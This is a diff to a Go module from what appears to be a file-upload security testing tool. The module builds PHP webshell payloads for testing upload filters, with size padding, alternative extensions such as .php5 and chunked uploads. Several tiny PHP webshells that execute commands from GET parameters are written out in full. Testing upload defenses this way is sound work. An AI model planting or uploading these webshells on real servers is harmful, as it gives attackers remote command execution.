@@ -1,7 +1,7 @@
 package payload
 
 import (
-    "bytes"
+	"bytes"
 	"fmt"
 	"strings"
 )
@@ -39,10 +39,10 @@ func moduleE() []*Payload {
 	for _, st := range sizeTests {
 		// Create body with PHP code followed by padding
 		body := make([]byte, st.size)
-		
+
 		// Copy PHP webshell at the beginning
 		copy(body, phpWebshell)
-		
+
 		// Fill remaining bytes with padding (simulates large file)
 		if st.size > len(phpWebshell) {
 			padding := []byte(" // PADDING_DATA_TO_REACH_SIZE_LIMIT_")
@@ -52,7 +52,7 @@ func moduleE() []*Payload {
 		}
 
 		tests = append(tests, &Payload{
-			TestType:  TestTypeExtensionEvasion,
+			TestType:  TestTypeSizeBoundary, // 🚀 Fixed mapping
 			Technique: fmt.Sprintf("Size boundary: %s PHP file", st.label),
 			Filename:  fmt.Sprintf("size_%s.php", strings.ToLower(strings.ReplaceAll(st.label, " ", "_"))),
 			Extension: ".php",
@@ -63,8 +63,8 @@ func moduleE() []*Payload {
 
 	// E2: Size boundary with alternative extensions (bypass size + extension filters)
 	altExtSizeTests := []struct {
-		ext  string
-		size int
+		ext   string
+		size  int
 		label string
 	}{
 		{".php5", 1024, "1KB"},
@@ -77,7 +77,7 @@ func moduleE() []*Payload {
 	for _, st := range altExtSizeTests {
 		body := make([]byte, st.size)
 		copy(body, getPayloadForExtension(st.ext))
-		
+
 		if st.size > len(phpWebshell) {
 			padding := []byte(" // SIZE_PADDING_")
 			for i := len(phpWebshell); i < st.size; i++ {
@@ -86,7 +86,7 @@ func moduleE() []*Payload {
 		}
 
 		tests = append(tests, &Payload{
-			TestType:  TestTypeExtensionEvasion,
+			TestType:  TestTypeSizeBoundary, // 🚀 Fixed mapping
 			Technique: fmt.Sprintf("Size + Extension bypass: %s %s file", st.label, st.ext),
 			Filename:  fmt.Sprintf("size_bypass_%s%s", strings.ToLower(st.label), st.ext),
 			Extension: st.ext,
@@ -110,7 +110,7 @@ func moduleE() []*Payload {
 	for _, ct := range chunkTests {
 		body := make([]byte, ct.totalSize)
 		copy(body, phpWebshell)
-		
+
 		// Simulate chunked upload by marking chunk boundaries
 		chunkSize := ct.totalSize / ct.chunks
 		for i := 0; i < ct.chunks; i++ {
@@ -121,7 +121,7 @@ func moduleE() []*Payload {
 		}
 
 		tests = append(tests, &Payload{
-			TestType:  TestTypeExtensionEvasion,
+			TestType:  TestTypeSizeBoundary, // 🚀 Fixed mapping
 			Technique: fmt.Sprintf("Chunked upload simulation: %s", ct.technique),
 			Filename:  fmt.Sprintf("chunked_%d_chunks.php", ct.chunks),
 			Extension: ".php",
@@ -149,14 +149,14 @@ func moduleE() []*Payload {
 	for _, ec := range edgeCases {
 		body := make([]byte, ec.size)
 		copy(body, phpWebshell)
-		
+
 		if ec.size > len(phpWebshell) {
 			padding := bytes.Repeat([]byte("P"), ec.size-len(phpWebshell))
 			copy(body[len(phpWebshell):], padding)
 		}
 
 		tests = append(tests, &Payload{
-			TestType:  TestTypeExtensionEvasion,
+			TestType:  TestTypeSizeBoundary, // 🚀 Fixed mapping
 			Technique: fmt.Sprintf("Edge case: %s (%d bytes)", ec.technique, ec.size),
 			Filename:  fmt.Sprintf("edge_%d_bytes.php", ec.size),
 			Extension: ".php",
@@ -170,16 +170,16 @@ func moduleE() []*Payload {
 		shell     []byte
 		technique string
 	}{
-		{[]byte(`<?=`+"`$_GET[0]`"+`?>`), "Ultra-short PHP webshell (15 bytes)"},
+		{[]byte(`<?=` + "`$_GET[0]`" + `?>`), "Ultra-short PHP webshell (15 bytes)"},
 		{[]byte(`<?=system($_GET[1])?>`), "Short PHP system call (22 bytes)"},
 		{[]byte(`<?php exec($_GET[c]);?>`), "Compact PHP exec (23 bytes)"},
-		{[]byte(`<?=`+"`ls`"+`?>`), "Tiny command (9 bytes)"},
+		{[]byte(`<?=` + "`ls`" + `?>`), "Tiny command (9 bytes)"},
 		{[]byte(`<?=phpinfo()?>`), "PHP info leak (15 bytes)"},
 	}
 
 	for _, ts := range tinyShells {
 		tests = append(tests, &Payload{
-			TestType:  TestTypeExtensionEvasion,
+			TestType:  TestTypeSizeBoundary, // 🚀 Fixed mapping
 			Technique: ts.technique,
 			Filename:  "tiny.php",
 			Extension: ".php",
@@ -203,14 +203,14 @@ func moduleE() []*Payload {
 	for _, sct := range sizeWithCT {
 		body := make([]byte, sct.size)
 		copy(body, phpWebshell)
-		
+
 		if sct.size > len(phpWebshell) {
 			padding := bytes.Repeat([]byte("A"), sct.size-len(phpWebshell))
 			copy(body[len(phpWebshell):], padding)
 		}
 
 		tests = append(tests, &Payload{
-			TestType:    TestTypeContentTypeSpoof,
+			TestType:    TestTypeContentTypeSpoof, // Standardized categorization
 			Technique:   sct.technique,
 			Filename:    fmt.Sprintf("size_ct_%d.php", sct.size),
 			Extension:   ".php",
